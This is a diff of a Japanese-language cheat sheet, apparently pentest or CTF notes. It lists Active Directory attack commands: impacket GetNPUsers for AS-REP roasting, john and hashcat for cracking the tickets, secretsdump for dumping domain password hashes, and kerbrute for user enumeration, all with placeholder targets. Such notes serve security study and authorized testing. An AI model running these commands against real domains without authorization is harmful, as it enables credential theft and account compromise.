@@ -26,16 +26,17 @@
 - [impacket](https://github.com/fortra/impacket) (Kali〇, python)  
   `impacket-〇〇`以外に、`python3 /usr/share/doc/python3-impacket/examples/〇〇.py`でも実行できる
   - GetNPUsers  
-   「`impacket-GetNPusers` -format john -no-pass -dc-ip ドメコンIP ドメイン名/ユーザ名」  
+   「`impacket-GetNPUsers` -no-pass -dc-ip ドメコンIP ドメイン名/ユーザ名 -outputfile 出力ファイル名」  
    で`ASREPRoast`（Kerberos事前認証を必要としていないユーザのTGTチケットを取得できる）を実行  
-   取得したTGTチケットを「john --wordlist=Wordlist名 Ticketファイル」でクラックできる
+   取得したTGTチケットを「john --wordlist=Wordlist名 Ticketファイル」または「hashcat -a 0 -m 18200 」でクラックできる  
+　 「`impacket-GetNPUsers -no-pass -dc-ip ドメコンIP -userfile ユーザリスト ドメイン名/ -outputfile 出力ファイル名`」では「-userfile」内の各ユーザがASREPRoastできるかどうか確認できる
   - secretsdump  
     「`impacket-secretsdump` -just-dc ドメイン名/ユーザ名:パスワード@IPアドレス」  
     でドメインユーザのパスワードハッシュをダンプできる。
 - [kerbrute](https://github.com/ropnop/kerbrute) (kali×, Go)
   - install  
     GitHub上のReleaseからLinuxバイナリをインストール
-  - 「`./kerbrute` userenum -d ドメイン名 --dc ターゲットIP Wordlists名」Domainユーザの発見
+  - 「`./kerbrute` userenum -d ドメイン名 --dc ドメコンIP Wordlists名 -o 出力ファイル名」Domainユーザの列挙
 - smbclient (kali〇, ELF)  
   「`smbcleint` -L IPアドレス or FQDN -U ユーザ名%パスワード」共有フォルダの列挙  
   「`smbclient` //IPアドレス/共有名 -U ユーザ名%パスワード」共有フォルダにアクセス
